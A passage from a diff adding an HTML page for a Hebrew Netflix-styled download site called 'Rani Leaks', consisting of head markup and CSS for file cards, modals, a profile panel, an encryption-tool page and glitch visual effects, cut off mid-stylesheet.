@@ -1,0 +1,1620 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rani Leaks — הורד כל מה שתרצה</title>
+<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300;400;500;700;900&family=Bebas+Neue&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --red:#E50914;--red-dark:#B20710;
+  --bg:#111;--bg2:#161616;--bg3:#1e1e1e;--bg4:#272727;
+  --text:#f0f0f0;--text2:#999;--text3:#555;
+  --green:#46d369;--blue:#0ea5e9;
+  --border:#2a2a2a;
+}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Heebo',sans-serif;overflow-x:hidden;}
+
+/* ===== NAV ===== */
+nav{position:sticky;top:0;z-index:100;padding:0 5vw;display:flex;align-items:center;justify-content:space-between;height:62px;background:var(--bg);border-bottom:1px solid var(--border);}
+nav.solid{background:var(--bg);}
+.logo{font-family:'Bebas Neue',cursive;font-size:2rem;color:var(--red);letter-spacing:3px;cursor:pointer;user-select:none;}
+.nav-links{display:flex;gap:6px;list-style:none;}
+.nav-links a{color:var(--text2);text-decoration:none;font-size:0.88rem;padding:6px 12px;border-radius:6px;transition:all 0.15s;}
+.nav-links a:hover{color:#fff;background:rgba(255,255,255,0.07);}
+.nav-links a.active{color:#fff;}
+.nav-right{display:flex;align-items:center;gap:12px;}
+.nav-search{background:var(--bg3);border:1px solid var(--border);color:#fff;padding:7px 14px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.85rem;outline:none;width:200px;transition:border-color 0.2s,width 0.3s;}
+.nav-search:focus{border-color:#555;width:260px;}
+.nav-search::placeholder{color:#555;}
+.nav-avatar{width:34px;height:34px;border-radius:8px;background:var(--red);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:0.9rem;cursor:pointer;transition:opacity 0.2s;}
+.nav-avatar:hover{opacity:0.85;}
+.nav-bell{background:none;border:none;color:#666;font-size:1.1rem;cursor:pointer;position:relative;transition:color 0.2s;}
+.nav-bell:hover{color:#ccc;}
+.nav-bell-dot{position:absolute;top:-2px;right:-2px;width:7px;height:7px;background:var(--red);border-radius:50%;border:2px solid var(--bg);}
+
+/* ===== HERO ===== */
+.hero{padding:70px 5vw 50px;text-align:center;border-bottom:1px solid var(--border);background:var(--bg);position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(229,9,20,0.06) 0%,transparent 70%);pointer-events:none;}
+.hero-bg{display:none;}
+.hero-backdrop{display:none;}
+.hero-art{display:none;}
+.hero-content{position:relative;z-index:1;max-width:680px;margin:0 auto;animation:fadeUp 0.6s ease both;}
+.hero-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(229,9,20,0.1);border:1px solid rgba(229,9,20,0.3);color:#ff6b6b;padding:4px 12px;border-radius:20px;font-size:0.72rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:20px;}
+.hero-title{font-size:clamp(2rem,5vw,3.4rem);font-weight:900;line-height:1.15;margin-bottom:14px;letter-spacing:-0.5px;}
+.hero-title span{color:var(--red);}
+.hero-filemeta{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;flex-wrap:wrap;}
+.file-type-badge{background:rgba(14,165,233,0.12);border:1px solid rgba(14,165,233,0.3);color:#38bdf8;padding:3px 10px;border-radius:20px;font-size:0.72rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.file-size{color:#888;font-size:0.88rem;}
+.file-date{color:#666;font-size:0.85rem;}
+.hero-desc{color:#888;font-size:0.95rem;line-height:1.7;margin-bottom:30px;max-width:520px;margin-right:auto;margin-left:auto;}
+/* Hero search bar */
+.hero-search-wrap{display:flex;gap:0;max-width:560px;margin:0 auto 20px;border:1px solid var(--border);border-radius:10px;overflow:hidden;background:var(--bg3);transition:border-color 0.2s;}
+.hero-search-wrap:focus-within{border-color:#555;}
+.hero-search-big{flex:1;background:none;border:none;color:#fff;padding:14px 18px;font-family:'Heebo',sans-serif;font-size:1rem;outline:none;}
+.hero-search-big::placeholder{color:#555;}
+.hero-search-btn{background:var(--red);border:none;color:#fff;padding:0 24px;font-family:'Heebo',sans-serif;font-size:0.95rem;font-weight:700;cursor:pointer;transition:background 0.2s;white-space:nowrap;}
+.hero-search-btn:hover{background:var(--red-dark);}
+.hero-btns{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
+.btn-download{display:flex;align-items:center;gap:8px;background:var(--red);color:#fff;padding:11px 24px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.95rem;font-weight:700;border:none;cursor:pointer;transition:background 0.2s;}
+.btn-download:hover{background:var(--red-dark);}
+.btn-info{display:flex;align-items:center;gap:8px;background:var(--bg3);border:1px solid var(--border);color:#ccc;padding:11px 20px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.95rem;font-weight:500;cursor:pointer;transition:background 0.2s,border-color 0.2s;}
+.btn-info:hover{background:var(--bg4);border-color:#444;}
+/* Stats bar */
+.hero-stats{display:flex;gap:0;justify-content:center;margin-top:28px;border-top:1px solid var(--border);padding-top:24px;}
+.hero-stat{flex:1;max-width:160px;text-align:center;}
+.hero-stat:not(:last-child){border-left:1px solid var(--border);}
+.hs-num{font-size:1.6rem;font-weight:900;color:#fff;letter-spacing:-1px;}
+.hs-label{font-size:0.75rem;color:#555;margin-top:3px;}
+
+/* ===== CATEGORIES ===== */
+.categories{display:flex;gap:8px;padding:20px 5vw;overflow-x:auto;scrollbar-width:none;border-bottom:1px solid var(--border);}
+.categories::-webkit-scrollbar{display:none;}
+.cat-btn{flex-shrink:0;padding:7px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg3);color:#999;font-family:'Heebo',sans-serif;font-size:0.82rem;font-weight:600;cursor:pointer;transition:all 0.15s;white-space:nowrap;}
+.cat-btn:hover{background:var(--bg4);color:#ddd;border-color:#444;}
+.cat-btn.active{background:rgba(229,9,20,0.12);color:#ff6b6b;border-color:rgba(229,9,20,0.35);}
+
+/* ===== ROWS ===== */
+.rows{padding:0 5vw 60px;}
+.row{margin-bottom:40px;padding-top:32px;border-top:1px solid var(--border);}
+.row:first-child{border-top:none;padding-top:28px;}
+.row-title{font-size:1rem;font-weight:700;margin-bottom:16px;display:flex;align-items:center;gap:10px;color:#ddd;}
+.row-title .arrow{font-size:0.78rem;color:var(--red);opacity:0;transition:opacity 0.2s;cursor:pointer;font-weight:600;}
+.row:hover .row-title .arrow{opacity:1;}
+.cards-track{display:flex;gap:10px;overflow-x:auto;padding-bottom:6px;scrollbar-width:none;}
+.cards-track::-webkit-scrollbar{display:none;}
+
+/* ===== FILE CARD ===== */
+.card{flex-shrink:0;width:clamp(160px,20vw,220px);border-radius:10px;overflow:hidden;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;background:var(--bg3);border:1px solid var(--border);}
+.card:hover{transform:translateY(-4px);box-shadow:0 12px 32px rgba(0,0,0,0.4);border-color:#3a3a3a;}
+.card-img{width:100%;aspect-ratio:4/3;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden;gap:8px;}
+.g1{background:linear-gradient(135deg,#0f172a,#1e3a5f);}
+.g2{background:linear-gradient(135deg,#1c1000,#7c3d00);}
+.g3{background:linear-gradient(135deg,#001a0d,#004d25);}
+.g4{background:linear-gradient(135deg,#140025,#4a0070);}
+.g5{background:linear-gradient(135deg,#1a0000,#5c0000);}
+.g6{background:linear-gradient(135deg,#00101e,#003368);}
+.g7{background:linear-gradient(135deg,#071300,#1d4700);}
+.g8{background:linear-gradient(135deg,#160e00,#5c3a00);}
+.g9{background:linear-gradient(135deg,#170010,#550040);}
+.g10{background:linear-gradient(135deg,#001314,#00474d);}
+.file-icon{font-size:2.8rem;z-index:1;}
+.file-ext-badge{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.12);padding:2px 8px;border-radius:4px;font-size:0.65rem;font-weight:700;letter-spacing:1.5px;color:#aaa;text-transform:uppercase;z-index:1;}
+.file-name-overlay{position:absolute;bottom:0;left:0;right:0;padding:20px 10px 8px;background:linear-gradient(to top,rgba(0,0,0,0.85),transparent);font-size:0.7rem;font-weight:600;color:#ddd;text-align:center;line-height:1.3;}
+/* always-visible card info */
+.card-info{padding:10px 12px 6px;}
+.card-info-name{font-size:0.78rem;font-weight:700;color:#ddd;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:4px;}
+.card-info-row{display:flex;align-items:center;justify-content:space-between;}
+.card-info-size{font-size:0.7rem;color:#38bdf8;font-weight:600;}
+.card-info-dl{font-size:0.68rem;color:#555;}
+.card-progress{height:2px;background:#2a2a2a;margin:0 12px 0;}
+.card-progress-fill{height:100%;background:var(--red);}
+.card-overlay{position:absolute;inset:0;background:rgba(0,0,0,0.65);opacity:0;transition:opacity 0.2s;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:8px;padding:14px;}
+.card:hover .card-overlay{opacity:1;}
+.card-dl-btn{display:flex;align-items:center;gap:6px;background:var(--red);color:#fff;border:none;padding:8px 16px;border-radius:7px;font-family:'Heebo',sans-serif;font-size:0.82rem;font-weight:700;cursor:pointer;}
+.card-dl-btn:hover{background:var(--red-dark);}
+.card-overlay-size{font-size:0.72rem;color:#bbb;}
+.card-overlay-type{font-size:0.65rem;color:#38bdf8;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.card-bottom{display:flex;justify-content:space-between;align-items:center;padding:6px 12px 10px;}
+.card-dl-count{font-size:0.68rem;color:#555;display:flex;align-items:center;gap:3px;}
+.card-acts{display:flex;gap:4px;}
+.act-btn{height:24px;padding:0 8px;border-radius:5px;border:1px solid var(--border);background:none;color:#777;cursor:pointer;font-size:0.7rem;transition:all 0.15s;}
+.act-btn:hover{border-color:#555;color:#ccc;background:var(--bg4);}
+.act-btn.in-list{background:rgba(229,9,20,0.15);border-color:rgba(229,9,20,0.4);color:#ff6b6b;}
+
+/* ===== TOP 10 ===== */
+.top10-card{flex-shrink:0;display:flex;align-items:center;cursor:pointer;}
+.top10-num{font-family:'Bebas Neue',cursive;font-size:clamp(4.5rem,10vw,7.5rem);color:transparent;-webkit-text-stroke:2px rgba(255,255,255,0.1);line-height:1;min-width:65px;text-align:center;flex-shrink:0;z-index:1;transition:-webkit-text-stroke 0.2s;user-select:none;}
+.top10-card:hover .top10-num{-webkit-text-stroke:2px rgba(229,9,20,0.5);}
+.top10-inner{width:clamp(110px,13vw,165px);border-radius:8px;overflow:hidden;background:var(--bg3);border:1px solid var(--border);flex-shrink:0;transform:translateX(16px);transition:transform 0.2s;}
+.top10-card:hover .top10-inner{transform:translateX(16px) scale(1.05);}
+
+/* ===== WIDE CARD (featured) ===== */
+.wide-card{flex-shrink:0;width:clamp(240px,28vw,360px);border-radius:10px;overflow:hidden;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s;background:var(--bg3);border:1px solid var(--border);}
+.wide-card:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(0,0,0,0.4);}
+.wide-card-img{width:100%;aspect-ratio:16/9;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:14px;}
+.wide-card-img .wide-icon{font-size:3rem;z-index:1;}
+.wide-card-img .wide-ext{position:absolute;top:10px;right:10px;background:rgba(0,0,0,0.7);border:1px solid rgba(14,165,233,0.3);color:#38bdf8;padding:2px 8px;border-radius:4px;font-size:0.65rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;}
+.wide-overlay-text{position:absolute;bottom:0;left:0;right:0;padding:22px 12px 10px;background:linear-gradient(to top,rgba(0,0,0,0.9),transparent);font-size:0.85rem;font-weight:700;color:#fff;}
+.wide-card-body{padding:12px 14px 14px;}
+.wide-card-body p{font-size:0.78rem;color:#777;line-height:1.55;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+.wide-card-footer{display:flex;justify-content:space-between;align-items:center;margin-top:10px;}
+.wide-size{color:#38bdf8;font-size:0.8rem;font-weight:700;}
+.wide-dl-btn{background:var(--red);color:#fff;border:none;padding:7px 14px;border-radius:6px;font-family:'Heebo',sans-serif;font-size:0.78rem;font-weight:700;cursor:pointer;transition:background 0.2s;}
+.wide-dl-btn:hover{background:var(--red-dark);}
+
+/* ===== MODAL (file detail) ===== */
+.modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity 0.2s;}
+.modal-overlay.open{opacity:1;pointer-events:all;}
+.modal{background:var(--bg2);border:1px solid var(--border);border-radius:14px;max-width:580px;width:100%;max-height:90vh;overflow-y:auto;position:relative;transform:translateY(20px);transition:transform 0.2s;scrollbar-width:thin;scrollbar-color:#333 transparent;}
+.modal-overlay.open .modal{transform:translateY(0);}
+.modal-hero{width:100%;aspect-ratio:16/9;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:20px;border-radius:12px 12px 0 0;}
+.modal-hero-icon{font-size:4.5rem;z-index:1;}
+.modal-hero-ext{position:absolute;top:14px;left:14px;background:rgba(0,0,0,0.6);border:1px solid rgba(14,165,233,0.3);color:#38bdf8;padding:3px 10px;border-radius:5px;font-size:0.7rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;z-index:2;}
+.modal-hero-overlay{position:absolute;inset:0;background:linear-gradient(to top,var(--bg2) 0%,transparent 55%);}
+.modal-body{padding:0 22px 24px;}
+.modal-title{font-size:1.4rem;font-weight:800;margin-bottom:10px;line-height:1.2;letter-spacing:-0.3px;}
+.modal-meta{display:flex;gap:10px;align-items:center;margin-bottom:16px;flex-wrap:wrap;}
+.modal-meta .msize{color:#38bdf8;font-weight:700;font-size:0.85rem;}
+.modal-meta .mdate,.modal-meta .mcat{color:#666;font-size:0.82rem;}
+.modal-btns{display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap;}
+.modal-btn-dl{display:flex;align-items:center;gap:7px;background:var(--red);color:#fff;padding:10px 22px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.9rem;font-weight:700;border:none;cursor:pointer;transition:background 0.2s;}
+.modal-btn-dl:hover{background:var(--red-dark);}
+.modal-btn-copy{display:flex;align-items:center;gap:7px;background:rgba(14,165,233,0.1);border:1px solid rgba(14,165,233,0.25);color:#38bdf8;padding:10px 18px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.88rem;cursor:pointer;transition:background 0.2s;}
+.modal-btn-copy:hover{background:rgba(14,165,233,0.18);}
+.modal-btn-list{display:flex;align-items:center;gap:7px;background:var(--bg3);border:1px solid var(--border);color:#aaa;padding:10px 18px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:0.88rem;cursor:pointer;transition:all 0.2s;}
+.modal-btn-list:hover{border-color:#555;color:#fff;}
+.modal-btn-list.in-list{background:rgba(229,9,20,0.1);border-color:rgba(229,9,20,0.3);color:#ff6b6b;}
+.modal-desc{color:#888;font-size:0.88rem;line-height:1.65;margin-bottom:16px;}
+.modal-file-info{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:14px 16px;display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.fi-row{display:flex;flex-direction:column;gap:3px;}
+.fi-label{font-size:0.65rem;color:#444;text-transform:uppercase;letter-spacing:1.5px;}
+.fi-val{font-size:0.82rem;color:#bbb;}
+.modal-close{position:absolute;top:12px;right:12px;width:30px;height:30px;border-radius:7px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#aaa;font-size:1rem;cursor:pointer;z-index:10;display:flex;align-items:center;justify-content:center;transition:all 0.15s;}
+.modal-close:hover{background:rgba(255,255,255,0.1);color:#fff;}
+
+/* ===== DOWNLOAD TOAST ===== */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--bg3);border:1px solid var(--border);color:#ddd;padding:11px 20px;border-radius:10px;font-size:0.88rem;z-index:999;transition:transform 0.25s;display:flex;align-items:center;gap:10px;box-shadow:0 8px 24px rgba(0,0,0,0.4);}
+.toast.show{transform:translateX(-50%) translateY(0);}
+.toast-icon{color:var(--green);}
+
+/* ===== PROFILE PANEL ===== */
+.profile-overlay{position:fixed;inset:0;z-index:400;pointer-events:none;}
+.profile-overlay.open{pointer-events:all;}
+.profile-backdrop{position:absolute;inset:0;background:rgba(0,0,0,0);transition:background 0.3s;}
+.profile-overlay.open .profile-backdrop{background:rgba(0,0,0,0.5);}
+.profile-panel{position:absolute;top:0;left:0;bottom:0;width:320px;max-width:90vw;background:#141414;border-left:1px solid #2a2a2a;transform:translateX(-100%);transition:transform 0.35s cubic-bezier(.2,.8,.3,1);display:flex;flex-direction:column;overflow-y:auto;scrollbar-width:thin;scrollbar-color:#333 transparent;}
+.profile-overlay.open .profile-panel{transform:translateX(0);}
+.profile-header{padding:80px 24px 24px;border-bottom:1px solid #2a2a2a;}
+.profile-avatar-big{width:72px;height:72px;border-radius:12px;background:linear-gradient(135deg,#e50914,#831010);display:flex;align-items:center;justify-content:center;font-size:2rem;font-weight:700;margin-bottom:14px;box-shadow:0 8px 24px rgba(229,9,20,0.3);}
+.profile-name{font-size:1.3rem;font-weight:700;margin-bottom:4px;}
+.profile-sub{font-size:0.8rem;color:var(--text2);display:flex;align-items:center;gap:8px;}
+.profile-sub .plan{background:rgba(229,9,20,0.2);color:var(--red);border:1px solid rgba(229,9,20,0.3);padding:2px 10px;border-radius:12px;font-size:0.75rem;font-weight:600;}
+.profile-stats{display:grid;grid-template-columns:1fr 1fr 1fr;padding:20px 24px;border-bottom:1px solid #2a2a2a;gap:8px;}
+.stat-item{text-align:center;}
+.stat-num{font-size:1.5rem;font-weight:700;color:var(--red);}
+.stat-label{font-size:0.7rem;color:#777;margin-top:2px;}
+.profile-section{padding:20px 24px;}
+.profile-section-title{font-size:0.75rem;font-weight:700;letter-spacing:2px;color:#555;text-transform:uppercase;margin-bottom:14px;}
+.mylist-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.mylist-item{border-radius:6px;overflow:hidden;cursor:pointer;position:relative;transition:transform 0.2s;}
+.mylist-item:hover{transform:scale(1.04);}
+.mylist-img{width:100%;aspect-ratio:3/4;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;font-size:1.8rem;}
+.mylist-item-title{position:absolute;bottom:0;left:0;right:0;padding:20px 6px 6px;background:linear-gradient(to top,rgba(0,0,0,0.9),transparent);font-size:0.65rem;font-weight:600;text-align:center;}
+.mylist-remove{position:absolute;top:4px;right:4px;width:22px;height:22px;border-radius:50%;background:rgba(0,0,0,0.8);border:none;color:#ccc;font-size:0.7rem;cursor:pointer;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 0.2s;}
+.mylist-item:hover .mylist-remove{opacity:1;}
+.mylist-empty{text-align:center;color:#555;font-size:0.85rem;padding:24px 0;grid-column:1/-1;}
+.profile-menu-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.05);cursor:pointer;color:#ccc;font-size:0.9rem;transition:color 0.2s;}
+.profile-menu-item:hover{color:#fff;}
+.profile-menu-item:last-child{border-bottom:none;}
+.profile-menu-icon{width:32px;height:32px;background:rgba(255,255,255,0.07);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:0.9rem;flex-shrink:0;}
+.profile-close-btn{position:absolute;top:16px;left:16px;background:rgba(255,255,255,0.1);border:none;color:#fff;width:32px;height:32px;border-radius:50%;cursor:pointer;font-size:1rem;display:flex;align-items:center;justify-content:center;transition:background 0.2s;}
+.profile-close-btn:hover{background:rgba(255,255,255,0.2);}
+
+/* ===== FOOTER ===== */
+footer{padding:40px 5vw 28px;border-top:1px solid var(--border);color:var(--text3);}
+.footer-logo{font-family:'Bebas Neue',cursive;font-size:1.4rem;color:var(--red);margin-bottom:18px;letter-spacing:3px;}
+.footer-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:22px;}
+.footer-col p{font-size:0.78rem;line-height:2.2;cursor:pointer;color:#444;transition:color 0.15s;}
+.footer-col p:hover{color:#aaa;}
+.footer-bottom{font-size:0.72rem;border-top:1px solid var(--border);padding-top:14px;color:#333;}
+
+/* ===== ENCRYPTION TOOL ===== */
+.enc-page{position:fixed;inset:0;z-index:300;background:var(--bg);overflow-y:auto;transform:translateY(100%);transition:transform 0.45s cubic-bezier(.2,.8,.3,1);scrollbar-width:thin;scrollbar-color:#333 transparent;}
+.enc-page.open{transform:translateY(0);}
+.enc-topbar{position:sticky;top:0;z-index:10;display:flex;align-items:center;justify-content:space-between;padding:18px 5vw;background:rgba(10,10,10,0.95);backdrop-filter:blur(10px);border-bottom:1px solid #222;}
+.enc-topbar-logo{font-family:'Bebas Neue',cursive;font-size:1.6rem;color:var(--red);letter-spacing:3px;}
+.enc-close-btn{background:rgba(255,255,255,0.08);border:1px solid #444;color:#fff;padding:8px 20px;border-radius:5px;font-family:'Heebo',sans-serif;font-size:0.9rem;cursor:pointer;transition:background 0.2s;display:flex;align-items:center;gap:8px;}
+.enc-close-btn:hover{background:rgba(255,255,255,0.15);}
+.enc-hero{padding:60px 5vw 0;text-align:center;max-width:700px;margin:0 auto;}
+.enc-hero-icon{font-size:5rem;margin-bottom:20px;display:block;animation:float 3s ease-in-out infinite;}
+@keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+.enc-hero h1{font-family:'Bebas Neue',cursive;font-size:clamp(2.5rem,6vw,4.5rem);letter-spacing:3px;margin-bottom:12px;}
+.enc-hero h1 span{color:var(--red);}
+.enc-hero p{color:#aaa;font-size:1rem;line-height:1.6;margin-bottom:40px;}
+.enc-tabs{display:flex;gap:0;border:1px solid #333;border-radius:8px;overflow:hidden;max-width:320px;margin:0 auto 40px;}
+.enc-tab{flex:1;padding:11px 0;border:none;background:none;color:#aaa;font-family:'Heebo',sans-serif;font-size:0.9rem;font-weight:600;cursor:pointer;transition:all 0.2s;}
+.enc-tab.active{background:var(--red);color:#fff;}
+.enc-body{max-width:620px;margin:0 auto;padding:0 5vw 80px;}
+.drop-zone{border:2px dashed #333;border-radius:12px;padding:50px 30px;text-align:center;cursor:pointer;transition:all 0.25s;position:relative;background:rgba(255,255,255,0.02);}
+.drop-zone:hover,.drop-zone.drag-over{border-color:var(--red);background:rgba(229,9,20,0.06);}
+.drop-zone input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%;}
+.drop-icon{font-size:3rem;margin-bottom:14px;display:block;}
+.drop-title{font-size:1.1rem;font-weight:700;margin-bottom:8px;}
+.drop-sub{font-size:0.85rem;color:#666;}
+.file-selected{display:none;align-items:center;gap:14px;background:rgba(255,255,255,0.05);border:1px solid #333;border-radius:10px;padding:16px 20px;margin-top:16px;}
+.file-selected.show{display:flex;}
+.file-sel-icon{font-size:2rem;flex-shrink:0;}
+.file-sel-info{flex:1;min-width:0;}
+.file-sel-name{font-weight:600;font-size:0.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.file-sel-size{font-size:0.78rem;color:#777;margin-top:3px;}
+.file-sel-remove{background:none;border:none;color:#777;cursor:pointer;font-size:1.1rem;padding:4px;transition:color 0.2s;flex-shrink:0;}
+.file-sel-remove:hover{color:#fff;}
+.enc-field{margin-top:20px;}
+.enc-field label{display:block;font-size:0.8rem;font-weight:700;color:#777;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+.enc-input-wrap{position:relative;}
+.enc-input{width:100%;background:#111;border:1px solid #333;color:#fff;padding:12px 50px 12px 16px;border-radius:8px;font-family:'Heebo',sans-serif;font-size:1rem;outline:none;transition:border-color 0.2s;direction:ltr;text-align:left;}
+.enc-input:focus{border-color:var(--red);}
+.enc-eye{position:absolute;left:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#666;cursor:pointer;font-size:1.1rem;transition:color 0.2s;}
+.enc-eye:hover{color:#fff;}
+.pw-strength{display:flex;gap:4px;margin-top:8px;}
+.pw-bar{flex:1;height:3px;border-radius:2px;background:#222;transition:background 0.3s;}
+.pw-bar.weak{background:#e50914;}
+.pw-bar.medium{background:#f59e0b;}
+.pw-bar.strong{background:#46d369;}
+.pw-label{font-size:0.72rem;color:#666;margin-top:6px;}
+.enc-btn{width:100%;margin-top:24px;padding:15px;border:none;border-radius:8px;font-family:'Heebo',sans-serif;font-size:1.05rem;font-weight:700;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:10px;}
+.enc-btn-encrypt{background:var(--red);color:#fff;}
+.enc-btn-encrypt:hover{background:var(--red-dark);transform:translateY(-1px);}
+.enc-btn-decrypt{background:rgba(14,165,233,0.15);border:1px solid rgba(14,165,233,0.5);color:#38bdf8;}
+.enc-btn-decrypt:hover{background:rgba(14,165,233,0.25);}
+.enc-btn:disabled{opacity:0.4;cursor:not-allowed;transform:none;}
+.enc-progress{display:none;margin-top:20px;}
+.enc-progress.show{display:block;}
+.enc-progress-bar{height:6px;background:#222;border-radius:3px;overflow:hidden;margin-bottom:10px;}
+.enc-progress-fill{height:100%;border-radius:3px;transition:width 0.3s;width:0;}
+.enc-progress-fill.encrypting{background:linear-gradient(90deg,var(--red),#ff6b6b);}
+.enc-progress-fill.decrypting{background:linear-gradient(90deg,#0ea5e9,#38bdf8);}
+.enc-progress-label{font-size:0.82rem;color:#aaa;text-align:center;}
+.enc-result{display:none;margin-top:20px;background:rgba(70,211,105,0.08);border:1px solid rgba(70,211,105,0.3);border-radius:10px;padding:20px;text-align:center;}
+.enc-result.show{display:block;}
+.enc-result-icon{font-size:2.5rem;margin-bottom:10px;}
+.enc-result-title{font-size:1.1rem;font-weight:700;color:var(--green);margin-bottom:6px;}
+.enc-result-sub{font-size:0.85rem;color:#aaa;margin-bottom:16px;}
+.enc-result-dl{display:inline-flex;align-items:center;gap:8px;background:var(--green);color:#000;padding:10px 24px;border-radius:6px;font-family:'Heebo',sans-serif;font-size:0.9rem;font-weight:700;cursor:pointer;border:none;transition:opacity 0.2s;}
+.enc-result-dl:hover{opacity:0.85;}
+.enc-info-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:50px;}
+.enc-info-card{background:#111;border:1px solid #222;border-radius:10px;padding:20px;text-align:center;}
+.enc-info-card .ei-icon{font-size:2rem;margin-bottom:10px;}
+.enc-info-card .ei-title{font-size:0.9rem;font-weight:700;margin-bottom:6px;}
+.enc-info-card .ei-desc{font-size:0.78rem;color:#666;line-height:1.5;}
+@media(max-width:600px){.enc-info-grid{grid-template-columns:1fr;}}
+
+/* ===== ANIMATIONS ===== */
+@keyframes fadeUp{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:translateY(0);}}
+@keyframes shimmer{0%,100%{opacity:0.6;}50%{opacity:1;}}
+@keyframes slideIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+@keyframes dlPulse{0%,100%{transform:scale(1);}50%{transform:scale(1.04);}}
+
+/* ══════════════════════════════════════
+   ██████  EDIT EFFECTS  ██████
+══════════════════════════════════════ */
+
+/* --- SCANLINES --- */
+.fx-scanlines{position:fixed;inset:0;z-index:9990;pointer-events:none;background:repeating-linear-gradient(to bottom,transparent 0px,transparent 3px,rgba(0,0,0,0.07) 3px,rgba(0,0,0,0.07) 4px);}
+
+/* --- VIGNETTE --- */
+.fx-vignette{position:fixed;inset:0;z-index:9989;pointer-events:none;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,0.65) 100%);}
+
+/* --- RED SCAN LINE --- */
+.fx-scanmove{position:fixed;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,rgba(229,9,20,0.5) 50%,transparent 100%);z-index:9992;pointer-events:none;animation:scanMoveY 5s linear infinite;opacity:0.6;}
+@keyframes scanMoveY{0%{top:-2px;}100%{top:100vh;}}
+
+/* --- GLITCH BARS (horizontal) --- */
+.fx-glitch-bar{position:fixed;left:0;right:0;height:2px;z-index:9991;pointer-events:none;opacity:0;background:linear-gradient(90deg,transparent,rgba(229,9,20,0.8),rgba(0,255,255,0.4),transparent);}
+.fx-glitch-bar:nth-child(1){animation:glitchBarAnim 7s ease infinite;}
+.fx-glitch-bar:nth-child(2){animation:glitchBarAnim 7s ease 2.3s infinite;}
+.fx-glitch-bar:nth-child(3){animation:glitchBarAnim 7s ease 4.7s infinite;}
+@keyframes glitchBarAnim{0%,88%,100%{opacity:0;top:0;}89%{opacity:1;top:15vh;}90%{opacity:0.8;top:38vh;}91%{opacity:0;top:55vh;}93%{opacity:0.5;top:72vh;}94%{opacity:0;}}
+
+/* --- CLICK FLASH --- */
+.fx-flash{position:fixed;inset:0;z-index:9994;pointer-events:none;background:rgba(229,9,20,0.15);opacity:0;transition:opacity 0.04s;}
+.fx-flash.on{opacity:1;transition:none;}
+
+/* --- CURSOR GLOW --- */
+.fx-cursor{position:fixed;width:18px;height:18px;border-radius:50%;background:rgba(229,9,20,0.7);pointer-events:none;z-index:9995;transform:translate(-50%,-50%);filter:blur(5px);mix-blend-mode:screen;transition:transform 0.08s;}
+.fx-cursor-ring{position:fixed;width:36px;height:36px;border-radius:50%;border:1px solid rgba(229,9,20,0.35);pointer-events:none;z-index:9994;transform:translate(-50%,-50%);transition:all 0.18s ease;}
+
+/* --- LOGO GLITCH --- */
+.logo{position:relative;animation:logoGlitch 9s ease infinite;}
+@keyframes logoGlitch{
+  0%,91%,100%{text-shadow:0 0 12px rgba(229,9,20,0.5);filter:none;transform:none;}
